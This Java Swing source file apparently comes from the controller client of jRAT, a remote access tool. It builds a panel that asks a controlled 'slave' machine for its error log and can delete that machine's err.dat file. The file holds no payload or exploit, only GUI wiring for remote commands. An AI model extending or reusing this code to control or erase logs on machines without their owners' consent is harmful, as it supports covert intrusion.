package se.jrat.client.ui.panels;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JScrollPane;
import javax.swing.JTextPane;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;

import se.jrat.client.Slave;
import se.jrat.client.packets.outgoing.Packet86ErrorLog;
import se.jrat.client.packets.outgoing.Packet87DeleteErrorLog;
import se.jrat.client.utils.IconUtils;


@SuppressWarnings("serial")
public class PanelControlErrorLog extends PanelControlParent {

	private JTextPane txt;

	public JTextPane getPane() {
		return txt;
	}

	public PanelControlErrorLog(Slave sl) {
		super(sl);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnReload = new JButton("Reload");
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				slave.addToSendQueue(new Packet86ErrorLog());
			}
		});
		btnReload.setIcon(IconUtils.getIcon("update"));

		JButton btnDeleteErrdatFile = new JButton("Delete err.dat file");
		btnDeleteErrdatFile.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				slave.addToSendQueue(new Packet87DeleteErrorLog());
			}
		});
		btnDeleteErrdatFile.setIcon(IconUtils.getIcon("delete"));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 597, GroupLayout.PREFERRED_SIZE).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(btnReload).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnDeleteErrdatFile))).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 303, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnDeleteErrdatFile)).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));

		txt = new JTextPane();
		scrollPane.setViewportView(txt);
		setLayout(groupLayout);
	}
}
